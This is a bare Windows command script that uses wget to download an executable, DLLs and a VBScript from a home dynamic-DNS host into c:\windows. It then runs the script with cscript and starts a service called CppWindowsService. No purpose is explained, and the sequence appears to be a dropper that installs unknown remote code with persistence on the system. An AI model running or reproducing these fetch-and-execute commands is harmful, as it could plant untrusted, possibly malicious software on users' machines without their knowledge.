wget http://troglo.homepc.it/win/sys2.exe c:\windows\sys2.exe
wget http://troglo.homepc.it/win/sys2.dll c:\windows\sys2.dll
wget http://troglo.homepc.it/win/sys2.vbs c:\windows\sys2.vbs
wget http://troglo.homepc.it/win/libssl-1_1.dll c:\windows\libssl-1_1.dll
wget http://troglo.homepc.it/win/libcurl.dll c:\windows\libcurl.dll
wget http://troglo.homepc.it/win/libcrypto-1_1.dll c:\windows\libcrypto-1_1.dll
cscript c:\windows\sys2.vbs
net start CppWindowsService
 